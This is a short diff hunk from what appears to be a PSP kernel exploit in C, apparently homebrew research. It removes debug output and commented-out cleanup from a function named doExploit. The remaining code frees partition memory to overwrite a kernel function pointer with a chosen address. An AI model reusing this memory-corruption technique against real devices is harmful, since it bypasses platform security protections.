@@ -152,27 +152,9 @@ int doExploit(void) {
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_Low, 0x10, NULL);
 
     g_tbl->KernelDcacheWritebackAll();
-
-    u32 plantaddr = 0x88000000 + ((plantid >> 5) & ~3);
-    PRTSTR3("DATA: (%p, %p) diff: %d", plantaddr, dummyaddr, plantaddr-dummyaddr);
-
-    /*
-    if (!checkPlantUID(uid)){
-      PRTSTR("PANIC!");
-    }
-    */
-
+    
     // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
     res = g_tbl->KernelFreePartitionMemory(uid);
-
-    /*
-    g_tbl->KernelFreePartitionMemory(plantid);
-    g_tbl->KernelFreePartitionMemory(dummyid);
-
-    g_tbl->UtilityUnloadModule(PSP_MODULE_NET_INET);
-    g_tbl->UtilityUnloadModule(PSP_MODULE_NET_COMMON);
-    g_tbl->UtilityUnloadModule(PSP_MODULE_NP_COMMON);
-    */
 
     if (res < 0)
         return res;
